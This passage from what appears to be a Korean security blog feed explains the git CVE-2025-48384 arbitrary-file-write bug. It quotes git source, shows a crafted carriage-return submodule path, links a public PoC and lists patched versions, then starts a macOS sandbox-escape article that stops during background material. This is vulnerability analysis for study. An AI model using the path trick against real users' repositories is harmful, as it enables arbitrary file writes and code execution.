&#xACBD;&#xB85C; &#xAC12;&#xC774; &#xC77D;&#xC744; &#xB54C;&#xC640; &#xC4F8; &#xB54C; &#xB2E4;&#xB974;&#xAC8C; &#xC778;&#xC2DD;&#xB418;&#xB294; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xBD88;&#xC77C;&#xCE58;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC11C;&#xBE0C; &#xBAA8;&#xB4C8;&#xC774; &#xC758;&#xB3C4;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C;&#xC5D0; &#xBCF5;&#xC81C;&#xB418;&#xB3C4;&#xB85D; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>Git&#xC740; &#xAD6C;&#xC131; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xAE30;&#xB9CC; &#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xB2E4;&#xC2DC; &#xC4F8; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; <code>git config</code> &#xBA85;&#xB839;&#xC73C;&#xB85C; &#xC124;&#xC815; &#xAC12;&#xC744; &#xBC14;&#xAFB8;&#xBA74;, &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; <code>write_pair()</code>&#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; <code>key=value</code>&#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write_pair</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *key, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *value, [...]</span></span><span class="hljs-function"><span class="hljs-params">{</span></span><span class="hljs-function"><span class="hljs-params">       [...]</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">       <span class="hljs-comment">/*</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * Check to see if the value needs to be surrounded with a dq pair.</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * Note that problematic characters are always backslash-quoted; this</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * check is about not losing leading or trailing SP and strings that</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * follow beginning-of-comment characters (i.e. &apos;;&apos; and &apos;#&apos;) by the</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         * configuration parser.</span></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-comment">         */</span></span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">if</span> (value[<span class="hljs-number">0</span>] == <span class="hljs-string">&apos; &apos;</span>)</span></span><span class="hljs-function"><span class="hljs-params">                quote = <span class="hljs-string">&quot;\&quot;&quot;</span>;</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; value[i]; i++)</span></span><span class="hljs-function"><span class="hljs-params">                <span class="hljs-keyword">if</span> (value[i] == <span class="hljs-string">&apos;;&apos;</span> || value[i] == <span class="hljs-string">&apos;#&apos;</span>)</span></span><span class="hljs-function"><span class="hljs-params">                        quote = <span class="hljs-string">&quot;\&quot;&quot;</span>;</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">if</span> (i &amp;&amp; value[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&apos; &apos;</span>)</span></span><span class="hljs-function"><span class="hljs-params">                quote = <span class="hljs-string">&quot;\&quot;&quot;</span>;</span></span><span class="hljs-function"><span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">        strbuf_addf(&amp;sb, <span class="hljs-string">&quot;\t%s = %s&quot;</span>, key + store-&gt;baselen + <span class="hljs-number">1</span>, quote);</span></span></code></pre><p>&#xADF8;&#xB7F0;&#xB370; Git&#xC740; &#xAC12;&#xC744; &#xC4F8; &#xB54C;, &#xBB38;&#xC790;&#xC5F4;&#xC5D0; &#xACF5;&#xBC31;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xAC70;&#xB098;, &#xD2B9;&#xC815; &#xBB38;&#xC790;(<code>;</code>, <code>#</code>)&#xAC00; &#xC788;&#xC744; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; &#xD070; &#xB530;&#xC634;&#xD45C;&#xB85C; &#xAC10;&#xC2F8;&#xC11C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. <code>\r</code> &#xBB38;&#xC790;&#xB294; &#xAE30;&#xC874;&#xC5D0;&#xB294; &#xB530;&#xC634;&#xD45C; &#xCC98;&#xB9AC; &#xB300;&#xC0C1;&#xC774; &#xC544;&#xB2C8;&#xC5B4;&#xC11C;, &#xAC12;&#xC5D0; <code>\r</code>&#xC774; &#xB4E4;&#xC5B4;&#xC788;&#xB354;&#xB77C;&#xB3C4; &#xB530;&#xC634;&#xD45C; &#xC5C6;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; <code>.gitmodules</code> &#xD30C;&#xC77C;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC11C;&#xBE0C;&#xBAA8;&#xB4C8; &#xC124;&#xC815;&#xC774; &#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-section">[submodule &quot;foo&quot;]</span>  <span class="hljs-attr">path</span> = <span class="hljs-string">&quot;foo^M&quot;</span></code></pre><p>Git&#xC740; &#xC774; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xB54C; &#xC904; &#xB05D;&#xC758; <code>^M</code> (&#xC989; <code>\r</code>)&#xC744; &#xC81C;&#xAC70;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>path = &quot;foo&quot;</code> &#xB85C; &#xC778;&#xC2DD;&#xD558;&#xACE0;,  <code>&#x201C;foo&#x201D;</code>&#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD574; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.<br>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4; &#xC774; &#xACBD;&#xB85C; &#xC815;&#xBCF4;&#xAC00; Git &#xB0B4;&#xBD80; &#xC124;&#xC815;&#xD30C;&#xC77C; (ex. <code>.git/modules/foo/config</code>) &#xC5D0;  &#xAE30;&#xB85D;&#xB420; &#xB54C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-section">[core]</span>  <span class="hljs-attr">workdir</span> = ../../../foo^M</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xC810;&#xC740; Git&#xC774; &#xC774;&#xBBF8; <code>.gitmodules</code>&#xC5D0;&#xC11C; &#xC77D;&#xC740; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xACBD;&#xB85C;(path)&#xC5D0; &#xB300;&#xD574; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xB9C8;&#xCCE4;&#xB2E4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xC774; &#xAC12;&#xC774; &#xB2E4;&#xC2DC; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC77D;&#xD790; &#xB54C;&#xB294;, &#xC904; &#xB05D;&#xC758; <code>\r</code>&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC81C;&#xAC70;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC5EC;&#xC804;&#xC774; <code>&#x201C;foo&#x201D;</code>&#xCC98;&#xB7FC; &#xC77D;&#xD788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC989;, Git&#xC774; <code>&#x201C;foo&#x201D;</code> &#xACBD;&#xB85C;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74;&#xC11C; &#xC791;&#xC5C5;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C;&#xB85C;&#xB294; <code>&#x201C;foo^M&#x201D;</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC11C;&#xBE0C;&#xBAA8;&#xB4C8;&#xC744; &#xBCF5;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ul><li><a href="https://github.com/acheong08/CVE-2025-48384?tab=readme-ov-file">https://github.com/acheong08/CVE-2025-48384?tab=readme-ov-file</a></li></ul><p><code>git clone --recursive</code> &#xBA85;&#xB839;&#xC740; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC758; README&#xC5D0;&#xC11C; &#xC790;&#xC8FC; &#xAD8C;&#xC7A5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC774; &#xBA85;&#xB839;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC545;&#xC131; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xBC30;&#xD3EC;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xC720;&#xB3C4;&#xD568;&#xC73C;&#xB85C;&#xC368; &#xC784;&#xC758; &#xD30C;&#xC77C; &#xC4F0;&#xAE30;&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="image.png" alt="image.png"></p><p>&#xCDE8;&#xC57D;&#xD55C; git &#xBC84;&#xC804;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xACF5;&#xAC1C;&#xB41C; PoC&#xB97C; &#xD074;&#xB860;&#xD558;&#xBA74; tmp &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC544;&#xB798;&#xC5D0; &#xD30C;&#xC77C;&#xC774; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2.43.7, 2.44.4, 2.45.4, 2.46.4, 2.47.3, 2.48.2, 2.49.1, 2.50.1 &#xC774;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384">https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384</a></li><li><a href="https://github.com/acheong08/CVE-2025-48384?tab=readme-ov-file">https://github.com/acheong08/CVE-2025-48384?tab=readme-ov-file</a></li><li><a href="https://securitylabs.datadoghq.com/articles/git-arbitrary-file-write/">https://securitylabs.datadoghq.com/articles/git-arbitrary-file-write</a></li><li><a href="https://arcticwolf.com/resources/blog/poc-available-for-high-severity-arbitrary-file-write-in-git-cli-cve-2025-48384/">https://arcticwolf.com/resources/blog/poc-available-for-high-severity-arbitrary-file-write-in-git-cli-cve-2025-48384/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE%E2%80%912025%E2%80%9148384/">CVE‑2025‑48384</category>
      
      <category domain="https://hackyboiz.github.io/tags/git/">git</category>
      
      <category domain="https://hackyboiz.github.io/tags/Arbitrary-File-Write/">Arbitrary File Write</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/09/bekim/2025-08-09/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] macOS: Part2 - Sandbox Escape (ko)</title>
      <link>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/</link>
      <guid>https://hackyboiz.github.io/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/</guid>
      <pubDate>Thu, 07 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/&quot;&gt;macOS: Part0 - TCC Bypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyb</description>
        
      
      
      
      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/">macOS: Part0 - TCC Bypass</a></p><p><a href="https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/">macOS: Part1 - SIP Bypass</a> </p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/MacOS_Sandbox_Escape.png" alt="image.png"></p><p>macOS: Part2 - Sandbox Escape &#x2190; Now!</p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;~ clalxk&#xC785;&#xB2C8;&#xB2E4;! </p><p>&#xC624;&#xB298;&#xC740; &#xC9C0;&#xB09C; Part1&#xC5D0; &#xC774;&#xC5B4; Sandbox Escape&#xC5D0; &#xB300;&#xD574; &#xACF5;&#xBD80;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>macOS&#xC758; Sandbox &#xAC1C;&#xB150;&#xBD80;&#xD130; 1-day(CVE-2025-31191) &#xBD84;&#xC11D; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xB2F4;&#xC558;&#xC73C;&#xB2C8; &#xD568;&#xAED8; &#xACF5;&#xBD80;&#xD574;&#xBCF4;&#xC544;&#xC694;.. (&#xCC21;&#xAE0B;_&lt;)</p><h2 id="0-App"><a href="#0-App" class="headerlink" title="0. App"></a>0. App</h2><p>Windows&#xB098; Linux&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB2E4; &#xBCF4;&#xBA74; macOS&#xC758; <code>App</code>&#xC774;&#xB77C;&#xB294; &#xAC1C;&#xB150;&#xC774; &#xC0DD;&#xC18C;&#xD558;&#xAC8C; &#xB290;&#xAEF4;&#xC9C8; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;. &#xC0DD;&#xC18C;&#xD560; &#xBFD0; &#xC5B4;&#xB835;&#xC9C4; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4; b^_^b. &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xD558;&#xB098;&#xC758; &#xC2E4;&#xD589;&#xD30C;&#xC77C;(<code>.exe</code>, <code>a.out</code>)&#xC744; &#xC2E4;&#xD589;&#xD558;&#xBA74; &#xACE7;&#xBC14;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB3CC;&#xC544;&#xAC00;&#xACE0;, &#xD544;&#xC694;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB098; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xC5B4;&#xB518;&#xAC00;&#xC5D0;&#xC11C; &#xB530;&#xB85C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xAD6C;&#xC870;&#xB97C; &#xB5A0;&#xC62C;&#xB9AC;&#xAC8C; &#xB418;&#xC8E0;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; Windows&#xC5D0;&#xC11C;&#xB294; <code>notepad++.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, &#xADF8; &#xD30C;&#xC77C; &#xD558;&#xB098;&#xB9CC;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xACE0; &#xB3D9;&#xC791;&#xC744; &#xC2DC;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD544;&#xC694;&#xD55C; <code>.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB4E4;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xD3F4;&#xB354;&#xB098; &#xC124;&#xCE58; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBD88;&#xB7EC;&#xC624;&#xACE0;, &#xD658;&#xACBD; &#xC124;&#xC815;&#xC740; <code>.ini</code>&#xB098; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC19;&#xC740; &#xC678;&#xBD80; &#xC704;&#xCE58;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098;! macOS&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xAD6C;&#xC870;&#xAC00; &#xC870;&#xAE08; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</p><p>macOS&#xC5D0;&#xC11C;&#xB294; <code>App</code>&#xC774; &#xB2E8;&#xC21C;&#xD55C; &#xC2E4;&#xD589;&#xD30C;&#xC77C;(<code>.exe</code>, <code>.out</code>)&#xC774; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xAD6C;&#xC870;</strong>&#xB97C; &#xAC00;&#xC9C4; <strong><a href="https://en.wikipedia.org/wiki/Bundle_(macOS">&#xBC88;&#xB4E4;</a>(.app)</strong>&#xC774;&#xC5D0;&#xC694;. Finder&#xC5D0;&#xC11C;&#xB294; &#xD558;&#xB098;&#xC758; &#xC571;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC; &#xD130;&#xBBF8;&#xB110;&#xC5D0;&#xC11C; &#xBCF4;&#xBA74; <code>.app</code>&#xC740; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC774;&#xACE0;, &#xB0B4;&#xBD80;&#xC5D0;&#xB294; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xBFD0; &#xC544;&#xB2C8;&#xB77C; &#xD544;&#xC694;&#xD55C; <strong>&#xB9AC;&#xC18C;&#xC2A4;, &#xC124;&#xC815;&#xD30C;&#xC77C;, &#xD50C;&#xB7EC;&#xADF8;&#xC778;, &#xCF54;&#xB4DC; &#xC11C;&#xBA85; &#xC815;&#xBCF4; &#xB4F1;</strong>&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xC5B4;&#xC694;.</p><p>macOS&#xB294; &#xC571;&#xC744; &#x2018;&#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD558;&#xB098;&#x2019;&#xAC00; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xC571;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC704;&#xD55C; &#xBAA8;&#xB4E0; &#xAC78; &#xBB36;&#xC740; &#xD328;&#xD0A4;&#xC9C0; &#xB2E8;&#xC704;&#xB85C; &#xB2E4;&#xB8EC;&#xB2E4;</strong>&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xC2DC;&#xB85C; &#xAE30;&#xBCF8; &#xACC4;&#xC0B0;&#xAE30; &#xC571;&#xC744; &#xC0B4;&#xD3B4;&#xBCFC;&#xAC8C;&#xC694;!</p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image1.png" alt="image.png"></p><p>&#xC774; <code>Contents</code> &#xD3F4;&#xB354; &#xC548;&#xC5D4; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC694;&#xC18C;&#xB4E4;&#xC774; &#xB4E4;&#xC5B4; &#xC788;&#xC5B4;&#xC694;.</p><ul><li><code>MacOS/</code>: &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC774; &#xB4E4;&#xC5B4; &#xC788;&#xB294; &#xD3F4;&#xB354;</li><li><code>Info.plist</code>: &#xC571;&#xC758; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xB2F4;&#xC740; &#xC124;&#xC815;&#xD30C;&#xC77C;</li><li><code>Resources/</code>: &#xC544;&#xC774;&#xCF58;, &#xC774;&#xBBF8;&#xC9C0;, &#xC5B8;&#xC5B4;&#xD329;, &#xB9AC;&#xC18C;&#xC2A4; &#xB4F1;</li><li><code>PlugIns/</code>: (&#xC120;&#xD0DD;) &#xD50C;&#xB7EC;&#xADF8;&#xC778;&#xB4E4;</li><li><code>_CodeSignature/</code>: (&#xC120;&#xD0DD;) &#xCF54;&#xB4DC;&#xC11C;&#xBA85; &#xC815;&#xBCF4;</li><li><code>version.plist</code>, <code>PkgInfo</code>: (&#xC120;&#xD0DD;) &#xAE30;&#xD0C0; &#xC815;&#xBCF4;</li></ul><p><code>Info.plist</code> &#xB294; &#xC571;&#xC5D0; &#xB300;&#xD55C; &#xC911;&#xC694;&#xD55C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; XML &#xD615;&#xC2DD;&#xC758; &#xD30C;&#xC77C;&#xC774;&#xC5D0;&#xC694;.</p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xB294; &#xC2E4;&#xD589;&#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;, &#xC571; &#xC774;&#xB984;, &#xBC88;&#xB4E4; ID, &#xBC84;&#xC804; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleExecutable<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>Calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>CFBundleIdentifier<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>com.apple.calculator<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></code></pre><p>&#xC571;&#xC744; &#xC2E4;&#xD589;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><h3 id="0-1-Launching-an-App"><a href="#0-1-Launching-an-App" class="headerlink" title="0.1 Launching an App"></a><strong>0.1 Launching an App</strong></h3><p>&#xC571;&#xC744; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xB294; &#xAC74; &#xACB0;&#xAD6D; &#xC5B4;&#xB5A4; <strong>&#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xAC83;</strong>&#xC744; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; <code>CFBundleExecutable</code> &#xD0A4;&#xB85C; &#xC9C0;&#xC815;&#xB41C; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC774;&#xC8E0;. &#xADF8;&#xB7FC; &#xC774; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC5B4;&#xB5A4; &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB420;&#xAE4C;&#xC694;? </p><p><em>* <code>CFBundleExecutable</code> : macOS &#xC571; &#xBC88;&#xB4E4;&#xC758; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC778; <code>Info.plist</code>&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xB294; &#xD56D;&#xBAA9; &#xC911; &#xD558;&#xB098;&#xB85C;, <code>.app</code> &#xBC88;&#xB4E4; &#xC548;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; &#xC2E4;&#xD589;&#xB420; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC744; &#xC815;&#xC758;</em></p><p><img src="/2025/08/07/clalxk/MacOS_Sandbox_Escape_ko/image2.png" alt="image.png"></p><p><code>open -a Calculator</code> &#xBA85;&#xB839;&#xC740; &#xD3C9;&#xC18C;&#xC5D0; &#xACC4;&#xC0B0;&#xAE30; &#xC571;&#xC744; &#xB354;&#xBE14; &#xD074;&#xB9AD;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;&#xD55C;&#xB370;&#xC694;.</p><p>&#xACC4;&#xC0B0;&#xAE30;&#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; <code>ps</code> &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xD604;&#xC7AC; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>/System/Applications/Calculator.app/Contents/MacOS/Calculator</code>&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC774;&#xACE0;, &#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PID)&#xB294; 5012&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xBD80;&#xBAA8; &#xD504;&#xB85C;&#xC138;&#xC2A4; ID(PPID)&#xB97C; &#xBCF4;&#xBA74; <code>1</code>&#xC774;&#xC5D0;&#xC694;!</p><p>macOS&#xC5D0;&#xC11C; PID 1&#xC740; <code>/sbin/launchd</code>&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xB140;&#xC11D;&#xC740; macOS&#xC5D0;&#xC11C; <strong>&#xC2DC;&#xC2A4;&#xD15C; &#xC804;&#xCCB4; &#xBC0F; &#xC0AC;&#xC6A9;&#xC790;&#xBCC4; &#xB370;&#xBAAC;/&#xC5D0;&#xC774;&#xC804;&#xD2B8;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAD00;&#xB9AC;&#xC790; &#xC5ED;&#xD560;</strong>&#xC744; &#xD574;&#xC694;. Windows&#xC758; <code>services.exe</code>&#xB098; Linux&#xC758; <code>systemd</code>&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. launchd&#xB294; &#xB2E8;&#xC21C;&#xD788; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4;&#xB9CC; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C;, <strong>&#xBAA8;&#xB4E0; &#xC571;&#xC758; &#xBD80;&#xBAA8; &#xC5ED;&#xD560;</strong>&#xB3C4; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC0AC;&#xC6A9;&#xC790;&#xB4E4;&#xC740; macOS&#xC5D0;&#xC11C; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; <code>.app</code>&#xC744; &#xC2E4;&#xD589;&#xD560; &#xB54C;, GUI&#xC5D0;&#xC11C; &#xB354;&#xBE14;&#xD074;&#xB9AD;&#xD558;&#xAC70;&#xB098; <code>open -a</code> &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F4; 